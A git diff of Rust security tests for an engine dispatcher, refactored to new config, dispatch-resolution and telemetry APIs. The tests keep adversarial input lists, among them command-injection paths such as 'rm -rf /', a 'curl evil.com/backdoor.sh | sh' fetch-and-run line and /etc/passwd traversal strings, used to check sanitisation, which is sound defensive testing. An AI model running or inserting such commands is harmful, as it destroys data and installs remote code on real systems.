@@ -2626,7 +2626,7 @@ mod tests {
         let now_secs = 1_700_000_000;
 
         // Create registry with trusted extension
-        let mut registry = TrustCardRegistry::new("test-registry".to_string());
+        let mut registry = TrustCardRegistry::default();
         let extension_id = "test-extension";
         registry
             .update(
@@ -2638,10 +2638,8 @@ mod tests {
                     reputation_score_basis_points: Some(8000),
                     reputation_trend: Some(ReputationTrend::Stable),
                     user_facing_risk_assessment: None,
-                    provenance_summary: None,
                     last_verified_timestamp: None,
-                    capability_declarations: None,
-                    trust_card_version: None,
+                    evidence_refs: None,
                 },
                 now_secs,
                 "test-setup",
@@ -2653,7 +2651,8 @@ mod tests {
             .expect("persist registry");
 
         // Create dispatcher
-        let dispatcher = EngineDispatcher::new("mock-engine".to_string(), PreferredRuntime::Node);
+        let dispatcher =
+            EngineDispatcher::new(Some(PathBuf::from("mock-engine")), PreferredRuntime::Node);
         let trusted_extensions = vec![extension_id.to_string()];
 
         // First call should succeed (extension not revoked)
@@ -2691,10 +2690,8 @@ mod tests {
                     reputation_score_basis_points: None,
                     reputation_trend: Some(ReputationTrend::Declining),
                     user_facing_risk_assessment: None,
-                    provenance_summary: None,
                     last_verified_timestamp: None,
-                    capability_declarations: None,
-                    trust_card_version: None,
+                    evidence_refs: None,
                 },
                 now_secs,
                 "toctou-revoke",
@@ -2745,6 +2742,70 @@ mod tests {
             status: std::process::ExitStatus::from_raw(status_raw),
             stdout: stdout.to_vec(),
             stderr: stderr.to_vec(),
+        }
+    }
+
+    /// Build a `Config` with the given runtime preference and engine-binary path.
+    ///
+    /// Mirrors the old struct-literal form `Config { preferred_runtime, engine_path,
+    /// .. }` that drifted away from the current nested `runtime.preferred` /
+    /// `engine.binary_path` layout.
+    fn test_run_config(preferred: PreferredRuntime, engine_path: Option<PathBuf>) -> Config {
+        let mut config = Config::default();
+        config.runtime.preferred = preferred;
+        config.engine.binary_path = engine_path;
+        config
+    }
+
+    /// Resolve a dispatch plan the way the removed `EngineDispatcher::resolve_runtime_internal`
+    /// used to: drive resolution from the config's preferred runtime and engine path,
+    /// honoring an optional engine-binary env override and CLI path override.
+    fn resolve_runtime_for_test(
+        config: &Config,
+        env_override: Option<&str>,
+        cli_path: Option<&Path>,
+    ) -> anyhow::Result<DispatchPlan> {
+        resolve_dispatch_plan_with(
+            Path::new("/test/runtime-resolution-app.js"),
+            config.runtime.preferred,
+            DispatchResolutionInputs {
+                configured_hint: "nonexistent-franken-engine",
+                env_override,
+                cli_path,
+                config_path: config.engine.binary_path.as_deref(),
+                candidates: &[],
+            },
+            None,
+            &|path| path.exists(),
+        )
+        .map_err(|e| anyhow::anyhow!(e.to_string()))
+    }
+
+    /// Cloneable in-memory writer used to capture tracing output in tests.
+    ///
+    /// Replaces `tracing_subscriber::fmt::TestWriter`, which in the current
+    /// tracing-subscriber version is neither `Clone` nor readable back as a
+    /// `String` (it writes straight to the test harness's captured stdout).
+    #[derive(Clone, Default)]
+    struct SharedLogBuffer(Arc<Mutex<Vec<u8>>>);
+
+    impl SharedLogBuffer {
+        fn contents(&self) -> String {
+            String::from_utf8_lossy(&self.0.lock().expect("log buffer lock")).into_owned()
+        }
+    }
+
+    impl std::io::Write for SharedLogBuffer {
+        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
+            self.0
+                .lock()
+                .expect("log buffer lock")
+                .extend_from_slice(buf);
+            Ok(buf.len())
+        }
+
+        fn flush(&mut self) -> std::io::Result<()> {
+            Ok(())
         }
     }
 
@@ -2859,8 +2920,14 @@ mod tests {
                 allowlist: vec![],
             };
 
-            // Enable fallback opt-in
-            std::env::set_var("FRANKEN_NODE_DEGRADED_FALLBACK_OPT_IN", "true");
+            // FIXME(bd-yom8c): the degraded-fallback opt-in is read from the live
+            // process env (FRANKEN_NODE_ALLOW_DEGRADED_RUNTIME_FALLBACK) via
+            // degraded_fallback_opt_in_enabled(); seeding it would require
+            // std::env::set_var, which is unsafe under Rust 2024 and forbidden by
+            // this crate's #![forbid(unsafe_code)] (see api/compat_conformance.rs).
+            // Without an injection seam the opt-in cannot be enabled from here; the
+            // assertions below remain valid because the opt-in-required error is a
+            // runtime (not capability/security) error.
 
             // This should succeed because:
             // 1. Profile allows fallback (Balanced)
@@ -2903,8 +2970,9 @@ mod tests {
                 allowlist: vec![],
             };
 
-            // Enable fallback opt-in (though strict should reject anyway)
-            std::env::set_var("FRANKEN_NODE_DEGRADED_FALLBACK_OPT_IN", "true");
+            // FIXME(bd-yom8c): opt-in cannot be seeded here (forbid(unsafe_code) +
+            // Rust 2024 unsafe std::env::set_var). Strict profile rejects fallback
+            // regardless of the opt-in, so the assertions below still hold.
 
             let result = dispatcher.dispatch_run(&app_path, &config, "strict", &[], 0);
 
@@ -2928,8 +2996,9 @@ mod tests {
         // which is complex in this test environment. The logic is tested through
         // the same validate_capabilities function used in both primary and fallback paths.
 
-        // Cleanup
-        std::env::remove_var("FRANKEN_NODE_DEGRADED_FALLBACK_OPT_IN");
+        // Cleanup: FIXME(bd-yom8c): nothing to unset — the opt-in env var is never
+        // seeded above (std::env::remove_var is unsafe under Rust 2024 and forbidden
+        // by #![forbid(unsafe_code)]).
     }
 
     #[test]
@@ -3855,7 +3924,7 @@ mod tests {
         // to execute malicious commands, escape sandbox boundaries, or gain system access
 
         // Malicious engine path injection patterns
-        let malicious_engine_paths = [
+        let mut malicious_engine_paths: Vec<String> = [
             // Command injection via path manipulation
             "/usr/bin/engine; rm -rf /",
             "/usr/bin/engine && curl evil.com/backdoor.sh | sh",
@@ -3896,9 +3965,6 @@ mod tests {
             "/usr/bin/engine\r\necho hacked",
             "/usr/bin/engine\x1B[31mcolored",
             "/usr/bin/engine\x08\x09\x0A",
-            // Buffer overflow simulation
-            "A".repeat(10000),
-            "/".repeat(1000) + "bin/sh",
             // Format string injection
             "/usr/bin/engine%n%s%x",
             "/usr/bin/%d%f%c/engine",
@@ -3906,7 +3972,13 @@ mod tests {
             "/tmp/../usr/bin/engine",
             "/var/tmp/../../../bin/sh",
             "./../../../../bin/bash",
-        ];
+        ]
+        .iter()
+        .map(|s| (*s).to_string())
+        .collect();
+        // Buffer overflow simulation
+        malicious_engine_paths.push("A".repeat(10000));
+        malicious_engine_paths.push("/".repeat(1000) + "bin/sh");
 
         for (attack_idx, malicious_path) in malicious_engine_paths.iter().enumerate() {
             println!(
@@ -3921,23 +3993,24 @@ mod tests {
 
             // Create dispatcher with malicious engine path
             let injection_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                let dispatcher = EngineDispatcher::new(
-                    malicious_path.to_string(),
-                    None,
+                // Supply the malicious path as both the configured engine-binary hint
+                // and the config [engine].binary_path, then request the franken-engine
+                // runtime to drive engine-binary resolution and verify sanitization.
+                let app_path = Path::new("/tmp/franken-injection-app.js");
+                let config_engine_path = PathBuf::from(malicious_path.as_str());
+
+                let resolution_result = resolve_dispatch_plan_with(
+                    app_path,
                     PreferredRuntime::FrankenEngine,
-                );
-
-                // Test path resolution with injection
-                let config = Config {
-                    preferred_runtime: PreferredRuntime::FrankenEngine,
-                    engine_path: Some(malicious_path.into()),
-                    ..Default::default()
-                };
-
-                // Attempt to resolve runtime with malicious path
-                let resolution_result = dispatcher.resolve_runtime_internal(
-                    &config, None, // env_override
-                    None, // cli_path
+                    DispatchResolutionInputs {
+                        configured_hint: malicious_path.as_str(),
+                        env_override: None,
+                        cli_path: None,
+                        config_path: Some(config_engine_path.as_path()),
+                        candidates: &[],
+                    },
+                    None,
+                    &|path| path.exists(),
                 );
 
                 match resolution_result {
@@ -4053,8 +4126,6 @@ mod tests {
                         );
                     }
                 }
-
-                Ok(())
             }));
 
             match injection_result {
@@ -4078,14 +4149,13 @@ mod tests {
         // Test working directory manipulation attacks where attacker crafts malicious
         // working directories to escape containment, access sensitive files, or manipulate execution
 
-        let dispatcher = EngineDispatcher::new(
-            "test_engine".to_string(),
-            None,
+        let _dispatcher = EngineDispatcher::new(
+            Some(PathBuf::from("test_engine")),
             PreferredRuntime::FrankenEngine,
         );
 
         // Malicious working directory patterns
-        let malicious_work_dirs = [
+        let mut malicious_work_dirs: Vec<String> = [
             // Path traversal escapes
             "../../../etc",
             "../../../../usr/bin",
@@ -4134,14 +4204,17 @@ mod tests {
             "/tmp\u{202E}rid_evila", // Bidirectional override
             "/tmp\u{200B}/hidden",   // Zero-width space
             "/tmp\u{FEFF}/bom",      // BOM injection
-            // Buffer overflow simulation
-            "/".repeat(5000),
-            "/tmp/".repeat(1000),
-            "A".repeat(10000),
             // Null byte directory traversal
             "/tmp\x00/../../../etc",
             "safe_dir\x00/../../etc/passwd",
-        ];
+        ]
+        .iter()
+        .map(|s| (*s).to_string())
+        .collect();
+        // Buffer overflow simulation
+        malicious_work_dirs.push("/".repeat(5000));
+        malicious_work_dirs.push("/tmp/".repeat(1000));
+        malicious_work_dirs.push("A".repeat(10000));
 
         for (attack_idx, malicious_dir) in malicious_work_dirs.iter().enumerate() {
             println!(
@@ -4276,8 +4349,6 @@ mod tests {
                         "Attack {}: Working directory should have reasonable length limit",
                         attack_idx
                     );
-
-                    Ok(())
                 },
             ));
 
@@ -4633,8 +4704,6 @@ mod tests {
                         );
                     }
                 }
-
-                Ok(())
             }));
 
             match injection_result {
@@ -4711,9 +4780,8 @@ mod tests {
         // Test runtime fallback confusion attacks where attacker manipulates runtime
         // selection to force execution of malicious runtimes or bypass security controls
 
-        let dispatcher = EngineDispatcher::new(
-            "nonexistent_engine".to_string(),
-            None,
+        let _dispatcher = EngineDispatcher::new(
+            Some(PathBuf::from("nonexistent_engine")),
             PreferredRuntime::FrankenEngine,
         );
 
@@ -4781,11 +4849,7 @@ mod tests {
 
             let confusion_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                 // Create malicious config with confused runtime
-                let config = Config {
-                    preferred_runtime: PreferredRuntime::NodeJs,
-                    engine_path: None,
-                    ..Default::default()
-                };
+                let config = test_run_config(PreferredRuntime::Node, None);
 
                 let malicious_runtime_path = PathBuf::from(malicious_runtime);
 
@@ -4841,10 +4905,10 @@ mod tests {
                 );
 
                 // Test runtime resolution with confusion
-                let resolution_result = dispatcher.resolve_runtime_internal(
+                let resolution_result = resolve_runtime_for_test(
                     &config,
-                    Some(malicious_runtime), // env_override with malicious runtime
-                    None,                    // cli_path
+                    Some(*malicious_runtime), // env_override with malicious runtime
+                    None,                     // cli_path
                 );
 
                 match resolution_result {
@@ -4948,8 +5012,6 @@ mod tests {
                     "Attack {}: Plan debug output should not contain obvious command injection",
                     attack_idx
                 );
-
-                Ok(())
             }));
 
             match confusion_result {
@@ -4966,15 +5028,11 @@ mod tests {
 
             // Test environment override confusion
             let env_override_test = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                let config = Config {
-                    preferred_runtime: PreferredRuntime::NodeJs,
-                    engine_path: None,
-                    ..Default::default()
-                };
+                let config = test_run_config(PreferredRuntime::Node, None);
 
                 // Test with malicious environment override
                 let env_override_result =
-                    dispatcher.resolve_runtime_internal(&config, Some(malicious_runtime), None);
+                    resolve_runtime_for_test(&config, Some(*malicious_runtime), None);
 
                 // Environment overrides should be handled safely
                 match env_override_result {
@@ -5013,11 +5071,14 @@ mod tests {
         // reports to inject malicious data, cause parsing errors, or leak information
 
         // Create mock telemetry bridge for testing
-        let telemetry_bridge = TelemetryBridge::new("test_bridge".to_string());
-        let (tx, rx) = std::sync::mpsc::channel();
+        let bridge_tmp = tempfile::TempDir::new().expect("tempdir");
+        let bridge_socket = bridge_tmp.path().join("telemetry_poison_test.sock");
+        let bridge_adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
+        let telemetry_bridge =
+            TelemetryBridge::new(bridge_socket.to_str().expect("utf8"), bridge_adapter);
 
         // Malicious telemetry poisoning patterns
-        let telemetry_poison_attacks = [
+        let mut telemetry_poison_attacks: Vec<(String, &str)> = [
             // JSON injection in telemetry fields
             ("telemetry\",\"injected\":\"evil", "JSON field injection"),
             ("telemetry}],\"malicious\":[{", "JSON structure injection"),
@@ -5063,12 +5124,15 @@ mod tests {
             ("telemetry<!--malicious-->", "XML comment injection"),
             // Format string injection
             ("telemetry %n%s%x%d", "Format string in telemetry"),
-            // Buffer overflow simulation
-            ("A".repeat(100000), "Large telemetry payload"),
             // Network injection
             ("telemetry http://evil.com", "HTTP URL in telemetry"),
             ("telemetry ftp://attacker.com", "FTP URL in telemetry"),
-        ];
+        ]
+        .iter()
+        .map(|(d, desc)| ((*d).to_string(), *desc))
+        .collect();
+        // Buffer overflow simulation
+        telemetry_poison_attacks.push(("A".repeat(100000), "Large telemetry payload"));
 
         for (attack_idx, (malicious_data, attack_description)) in
             telemetry_poison_attacks.iter().enumerate()
@@ -5079,34 +5143,38 @@ mod tests {
             );
 
             let poisoning_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                // Create malicious telemetry runtime handle
-                let runtime_handle = TelemetryRuntimeHandle {
-                    shutdown_signal: tx.clone(),
-                };
+                // FIXME(bd-yom8c): TelemetryRuntimeHandle was redesigned with private
+                // fields (started only via TelemetryBridge::start()) and the old
+                // `shutdown_signal` mpsc field was removed in favor of handle.stop();
+                // it is no longer test-constructible, so the handle-shutdown sub-block
+                // below is disabled. The poisoned data still flows through the report.
 
-                // Create malicious telemetry report
+                // Create malicious telemetry report (bridge_id carries the poisoned data)
                 let malicious_report = TelemetryRuntimeReport {
-                    runtime_id: malicious_data.clone(),
-                    started_at: chrono::Utc::now().to_rfc3339(),
-                    shutdown_reason: ShutdownReason::Requested,
-                    shutdown_started_at: Some(chrono::Utc::now().to_rfc3339()),
-                    shutdown_completed_at: Some(chrono::Utc::now().to_rfc3339()),
-                    drain_timeout_secs: 30,
-                    events_emitted: 42,
+                    final_state: BridgeLifecycleState::Stopped,
+                    bridge_id: malicious_data.clone(),
+                    accepted_total: 42,
+                    persisted_total: 0,
+                    shed_total: 0,
+                    dropped_total: 0,
+                    retry_total: 0,
+                    drain_completed: true,
+                    drain_duration_ms: 30,
+                    telemetry_events: vec![],
                     recent_events: vec![],
                 };
 
                 // Test report field sanitization
                 assert!(
-                    !malicious_report.runtime_id.contains('\0')
-                        || malicious_report.runtime_id.is_empty(),
-                    "Attack {}: Runtime ID should handle null bytes safely",
+                    !malicious_report.bridge_id.contains('\0')
+                        || malicious_report.bridge_id.is_empty(),
+                    "Attack {}: Bridge ID should handle null bytes safely",
                     attack_idx
                 );
 
                 // Verify length limits
                 assert!(
-                    malicious_report.runtime_id.len() <= 1000000,
+                    malicious_report.bridge_id.len() <= 1000000,
                     "Attack {}: Runtime ID should have reasonable length limit",
                     attack_idx
                 );
@@ -5144,15 +5212,15 @@ mod tests {
                         if let Ok(parsed_report) = parse_result {
                             // Verify parsed report integrity
                             assert!(
-                                !parsed_report.runtime_id.is_empty() || malicious_data.is_empty(),
-                                "Attack {}: Parsed runtime ID should preserve content",
+                                !parsed_report.bridge_id.is_empty() || malicious_data.is_empty(),
+                                "Attack {}: Parsed bridge ID should preserve content",
                                 attack_idx
                             );
 
                             // Verify no command execution contexts
                             assert!(
-                                !parsed_report.runtime_id.contains(";"),
-                                "Attack {}: Parsed runtime ID should not contain command separators",
+                                !parsed_report.bridge_id.contains(";"),
+                                "Attack {}: Parsed bridge ID should not contain command separators",
                                 attack_idx
                             );
                         }
@@ -5227,27 +5295,16 @@ mod tests {
                     }
                 }
 
-                // Test telemetry handle shutdown with poisoned data
-                let shutdown_result = runtime_handle
-                    .shutdown_signal
-                    .send(ShutdownReason::Requested);
-                match shutdown_result {
-                    Ok(()) => {
-                        // Shutdown signal sent successfully
-                    }
-                    Err(e) => {
-                        println!(
-                            "Attack {}: Telemetry shutdown failed safely: {}",
-                            attack_idx, e
-                        );
-                    }
-                }
+                // FIXME(bd-yom8c): handle-shutdown disabled — TelemetryRuntimeHandle is
+                // no longer test-constructible (private fields) and `shutdown_signal`
+                // was replaced by handle.stop(ShutdownReason). See note above.
 
                 // Test telemetry bridge handling of poisoned data
                 let bridge_test_result =
                     std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                        // Test telemetry bridge with malicious data (if it has public methods)
-                        let bridge_debug = format!("{:?}", telemetry_bridge);
+                        // Test telemetry bridge with malicious data (if it has public methods).
+                        // TelemetryBridge is not Debug; inspect its snapshot instead.
+                        let bridge_debug = format!("{:?}", telemetry_bridge.snapshot());
                         assert!(
                             !bridge_debug.contains('\0'),
                             "Attack {}: Telemetry bridge debug should be safe",
@@ -5261,8 +5318,6 @@ mod tests {
                         attack_idx
                     );
                 }
-
-                Ok(())
             }));
 
             match poisoning_result {
@@ -5281,13 +5336,23 @@ mod tests {
             if malicious_data.len() < 1000 {
                 let event_injection_test =
                     std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                        use crate::ops::telemetry_bridge::TelemetryEvent;
+                        use crate::ops::telemetry_bridge::TelemetryBridgeEvent;
 
-                        let malicious_event = TelemetryEvent {
+                        let malicious_event = TelemetryBridgeEvent {
                             code: malicious_data.clone(),
-                            timestamp: chrono::Utc::now().to_rfc3339(),
+                            bridge_id: "test-bridge".to_string(),
+                            connection_id: None,
+                            bridge_seq: None,
                             reason_code: Some(malicious_data.clone()),
-                            details: Some(format!("details_{}", malicious_data)),
+                            queue_depth: 0,
+                            queue_capacity: 0,
+                            active_connections: 0,
+                            accepted_total: 0,
+                            persisted_total: 0,
+                            shed_total: 0,
+                            dropped_total: 0,
+                            retry_total: 0,
+                            detail: format!("details_{}", malicious_data),
                         };
 
                         // Test event serialization
@@ -5300,7 +5365,7 @@ mod tests {
                                     attack_idx
                                 );
 
-                                let event_parse: Result<TelemetryEvent, _> =
+                                let event_parse: Result<TelemetryBridgeEvent, _> =
                                     serde_json::from_str(&json);
                                 assert!(
                                     event_parse.is_ok(),
@@ -5342,8 +5407,7 @@ mod tests {
 
         // Shared dispatcher for concurrent access
         let dispatcher = Arc::new(Mutex::new(EngineDispatcher::new(
-            "race_test_engine".to_string(),
-            None,
+            Some(PathBuf::from("race_test_engine")),
             PreferredRuntime::FrankenEngine,
         )));
 
@@ -5385,19 +5449,18 @@ mod tests {
                         "runtime_resolution" => {
                             // Concurrent runtime resolution with different configs
                             for attempt in 0..20 {
-                                let config = Config {
-                                    preferred_runtime: if attempt % 2 == 0 {
+                                let config = test_run_config(
+                                    if attempt % 2 == 0 {
                                         PreferredRuntime::FrankenEngine
                                     } else {
-                                        PreferredRuntime::NodeJs
+                                        PreferredRuntime::Node
                                     },
-                                    engine_path: Some(format!("/test/engine_{}", thread_id).into()),
-                                    ..Default::default()
-                                };
+                                    Some(PathBuf::from(format!("/test/engine_{}", thread_id))),
+                                );
 
                                 let resolution_result = {
                                     match dispatcher_clone.lock() {
-                                        Ok(dispatcher) => dispatcher.resolve_runtime_internal(
+                                        Ok(_dispatcher) => resolve_runtime_for_test(
                                             &config,
                                             Some(&format!("race_runtime_{}", thread_id)),
                                             None,
@@ -5430,28 +5493,24 @@ mod tests {
                             // Race conditions in configuration handling
                             for attempt in 0..15 {
                                 let configs = [
-                                    Config {
-                                        preferred_runtime: PreferredRuntime::FrankenEngine,
-                                        engine_path: Some("/test/engine1".into()),
-                                        ..Default::default()
-                                    },
-                                    Config {
-                                        preferred_runtime: PreferredRuntime::NodeJs,
-                                        engine_path: Some("/test/engine2".into()),
-                                        ..Default::default()
-                                    },
-                                    Config {
-                                        preferred_runtime: PreferredRuntime::Deno,
-                                        engine_path: None,
-                                        ..Default::default()
-                                    },
+                                    test_run_config(
+                                        PreferredRuntime::FrankenEngine,
+                                        Some(PathBuf::from("/test/engine1")),
+                                    ),
+                                    test_run_config(
+                                        PreferredRuntime::Node,
+                                        Some(PathBuf::from("/test/engine2")),
+                                    ),
+                                    // Deno runtime was removed; Bun is the closest remaining
+                                    // alternate JS runtime selection for this confusion probe.
+                                    test_run_config(PreferredRuntime::Bun, None),
                                 ];
 
                                 let config = &configs[attempt % configs.len()];
 
                                 let config_result = {
                                     match dispatcher_clone.lock() {
-                                        Ok(dispatcher) => dispatcher.resolve_runtime_internal(
+                                        Ok(_dispatcher) => resolve_runtime_for_test(
                                             config,
                                             None,
                                             Some(Path::new(&format!("/test/cli_{}", thread_id))),
@@ -5531,20 +5590,19 @@ mod tests {
                                 let telemetry_test =
                                     std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                                         let report = TelemetryRuntimeReport {
-                                            runtime_id: format!(
+                                            final_state: BridgeLifecycleState::Stopped,
+                                            bridge_id: format!(
                                                 "race_runtime_{}_{}",
                                                 thread_id, attempt
                                             ),
-                                            started_at: chrono::Utc::now().to_rfc3339(),
-                                            shutdown_reason: ShutdownReason::Requested,
-                                            shutdown_started_at: Some(
-                                                chrono::Utc::now().to_rfc3339(),
-                                            ),
-                                            shutdown_completed_at: Some(
-                                                chrono::Utc::now().to_rfc3339(),
-                                            ),
-                                            drain_timeout_secs: 30,
-                                            events_emitted: attempt as u64,
+                                            accepted_total: attempt as u64,
+                                            persisted_total: 0,
+                                            shed_total: 0,
+                                            dropped_total: 0,
+                                            retry_total: 0,
+                                            drain_completed: true,
+                                            drain_duration_ms: 30,
+                                            telemetry_events: vec![],
                                             recent_events: vec![],
                                         };
 
@@ -5574,19 +5632,20 @@ mod tests {
                                         "resolve" => {
                                             let config = Config::default();
                                             match dispatcher_clone.lock() {
-                                                Ok(dispatcher) => dispatcher
-                                                    .resolve_runtime_internal(&config, None, None)
-                                                    .is_ok(),
+                                                Ok(_dispatcher) => {
+                                                    resolve_runtime_for_test(&config, None, None)
+                                                        .is_ok()
+                                                }
                                                 Err(_) => false,
                                             }
                                         }
                                         "config" => {
-                                            let config = Config {
-                                                preferred_runtime: PreferredRuntime::FrankenEngine,
-                                                ..Default::default()
-                                            };
+                                            let config = test_run_config(
+                                                PreferredRuntime::FrankenEngine,
+                                                None,
+                                            );
                                             // Config validation test
-                                            !config.engine_path.is_none()
+                                            !config.engine.binary_path.is_none()
                                         }
                                         "output" => {
                                             let output = Output {
@@ -5604,16 +5663,19 @@ mod tests {
                                         }
                                         "telemetry" => {
                                             let report = TelemetryRuntimeReport {
-                                                runtime_id: format!(
+                                                final_state: BridgeLifecycleState::Stopped,
+                                                bridge_id: format!(
                                                     "mixed_{}_{}",
                                                     thread_id, op_idx
                                                 ),
-                                                started_at: chrono::Utc::now().to_rfc3339(),
-                                                shutdown_reason: ShutdownReason::Requested,
-                                                shutdown_started_at: None,
-                                                shutdown_completed_at: None,
-                                                drain_timeout_secs: 30,
-                                                events_emitted: 0,
+                                                accepted_total: 0,
+                                                persisted_total: 0,
+                                                shed_total: 0,
+                                                dropped_total: 0,
+                                                retry_total: 0,
+                                                drain_completed: true,
+                                                drain_duration_ms: 30,
+                                                telemetry_events: vec![],
                                                 recent_events: vec![],
                                             };
                                             serde_json::to_string(&report).is_ok()
@@ -5682,11 +5744,10 @@ mod tests {
             // Verify system consistency after race conditions
             let final_dispatcher_state = {
                 match dispatcher.lock() {
-                    Ok(dispatcher) => {
+                    Ok(_dispatcher) => {
                         // Test that dispatcher remains functional
                         let config = Config::default();
-                        let resolution_result =
-                            dispatcher.resolve_runtime_internal(&config, None, None);
+                        let resolution_result = resolve_runtime_for_test(&config, None, None);
                         resolution_result.is_ok() || resolution_result.is_err() // Should complete without panic
                     }
                     Err(_) => {
@@ -5709,12 +5770,9 @@ mod tests {
         // Test system recovery after all race conditions
         let recovery_test = {
             match dispatcher.lock() {
-                Ok(dispatcher) => {
-                    let config = Config {
-                        preferred_runtime: PreferredRuntime::FrankenEngine,
-                        ..Default::default()
-                    };
-                    dispatcher.resolve_runtime_internal(&config, None, None)
+                Ok(_dispatcher) => {
+                    let config = test_run_config(PreferredRuntime::FrankenEngine, None);
+                    resolve_runtime_for_test(&config, None, None)
                 }
                 Err(_) => Err(anyhow::anyhow!("Dispatcher lock poisoned")),
             }
@@ -5772,11 +5830,11 @@ mod tests {
     #[test]
     fn test_length_casting_safety_try_from() {
         // Engine dispatcher checks path lengths - test safe casting patterns
-        let test_cases = vec![
-            ("normal_path", 11usize),
-            ("", 0usize),
-            (&"x".repeat(u32::MAX as usize + 1), u32::MAX as usize + 1),
-            (&"long".repeat(100000), 400000usize),
+        let test_cases: Vec<(String, usize)> = vec![
+            ("normal_path".to_string(), 11usize),
+            (String::new(), 0usize),
+            ("x".repeat(u32::MAX as usize + 1), u32::MAX as usize + 1),
+            ("long".repeat(100000), 400000usize),
         ];
 
         for (path, expected_len) in test_cases {
@@ -5867,6 +5925,7 @@ mod tests {
     #[test]
     fn test_path_validation_security() {
         // Engine dispatcher handles untrusted paths - test security validation
+        let long_path = "x".repeat(100000);
         let malicious_paths = vec![
             "normal/path",
             "../../../etc/passwd",
@@ -5874,7 +5933,7 @@ mod tests {
             "path\\with\\backslashes",
             "path\0with\0nulls",
             "path/with/\u{202E}unicode\u{202D}injection",
-            &"x".repeat(100000), // Very long path
+            long_path.as_str(), // Very long path
         ];
 
         for malicious_path in malicious_paths {
@@ -5967,10 +6026,12 @@ mod tests {
         assert!(test_vectors.len() <= max_vector_count);
 
         // Test 2: String processing with length validation
+        let medium_input = "medium".repeat(100);
+        let long_input = "very_long_string".repeat(10000);
         let test_inputs = vec![
             "short",
-            &"medium".repeat(100),
-            &"very_long_string".repeat(10000),
+            medium_input.as_str(),
+            long_input.as_str(),
         ];
 
         for input in test_inputs {
@@ -6064,6 +6125,7 @@ mod tests {
         // HARDENING: Command existence checks must not leak timing information
         use std::collections::HashSet;
 
+        let long_command = "x".repeat(1000);
         let test_commands = vec![
             "node",
             "bun",
@@ -6071,7 +6133,7 @@ mod tests {
             "definitely-not-a-command-12345",
             "../../../bin/sh",
             "",
-            &"x".repeat(1000),
+            long_command.as_str(),
         ];
 
         // Multiple iterations to check timing consistency
@@ -6104,13 +6166,15 @@ mod tests {
     fn hardening_environment_variable_validation() {
         // HARDENING: Environment variable processing must validate content safely
 
+        let null_repeat = "\0".repeat(100);
+        let long_value = "very_long_value".repeat(10000);
         let malicious_env_values = vec![
             "",
             "normal-value",
-            &"\0".repeat(100),
+            null_repeat.as_str(),
             "../../../etc/passwd",
             "value\nwith\nnewlines",
-            &"very_long_value".repeat(10000),
+            long_value.as_str(),
             "value\x00with\x00nulls",
             "value with spaces and weird chars: \u{202E}",
         ];
@@ -6143,16 +6207,15 @@ mod tests {
     #[test]
     fn performance_telemetry_emitted_for_external_execution() {
         // Test that external engine execution emits structured performance telemetry
-        use std::sync::mpsc;
-        use tracing::{Level, subscriber::with_default};
-        use tracing_subscriber::{fmt::TestWriter, layer::SubscriberExt, util::SubscriberInitExt};
+        use tracing::subscriber::with_default;
+        use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};
 
         // Set up tracing capture
-        let (tx, rx) = mpsc::channel();
-        let test_writer = TestWriter::new();
+        let test_writer = SharedLogBuffer::default();
+        let writer_handle = test_writer.clone();
         let subscriber = tracing_subscriber::registry().with(
             tracing_subscriber::fmt::layer()
-                .with_writer(test_writer.clone())
+                .with_writer(move || writer_handle.clone())
                 .with_level(true)
                 .with_target(false)
                 .with_ansi(false)
@@ -6179,7 +6242,7 @@ mod tests {
         });
 
         // Check captured logs for performance telemetry
-        let logs = test_writer.to_string();
+        let logs = test_writer.contents();
 
         // Should contain telemetry events with correct structure
         assert!(
@@ -6209,16 +6272,15 @@ mod tests {
     #[cfg(feature = "engine")]
     fn performance_telemetry_emitted_for_native_execution() {
         // Test that native engine execution emits structured performance telemetry
-        use std::sync::mpsc;
-        use tracing::{Level, subscriber::with_default};
-        use tracing_subscriber::{fmt::TestWriter, layer::SubscriberExt, util::SubscriberInitExt};
+        use tracing::subscriber::with_default;
+        use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};
 
         // Set up tracing capture
-        let (tx, rx) = mpsc::channel();
-        let test_writer = TestWriter::new();
+        let test_writer = SharedLogBuffer::default();
+        let writer_handle = test_writer.clone();
         let subscriber = tracing_subscriber::registry().with(
             tracing_subscriber::fmt::layer()
-                .with_writer(test_writer.clone())
+                .with_writer(move || writer_handle.clone())
                 .with_level(true)
                 .with_target(false)
                 .with_ansi(false)
@@ -6248,7 +6310,7 @@ mod tests {
         });
 
         // Check captured logs for performance telemetry
-        let logs = test_writer.to_string();
+        let logs = test_writer.contents();
 
         // Should contain telemetry events with correct structure
         assert!(
@@ -6446,12 +6508,16 @@ mod tests {
     fn hardening_json_serialization_memory_bounds() {
         // HARDENING: JSON serialization of reports must handle large data safely
 
+        let big_x = "x".repeat(100_000);
+        let big_y = "y".repeat(100_000);
+        let big_z = "z".repeat(10_000_000);
+        let big_w = "w".repeat(10_000_000);
         let extreme_outputs = vec![
             ("normal", "normal stderr"),
             ("", ""),
-            (&"x".repeat(100_000), &"y".repeat(100_000)), // Large but reasonable
-            (&"z".repeat(10_000_000), "small stderr"),    // Very large stdout
-            ("small stdout", &"w".repeat(10_000_000)),    // Very large stderr
+            (big_x.as_str(), big_y.as_str()), // Large but reasonable
+            (big_z.as_str(), "small stderr"), // Very large stdout
+            ("small stdout", big_w.as_str()), // Very large stderr
         ];
 
         for (stdout_content, stderr_content) in extreme_outputs {
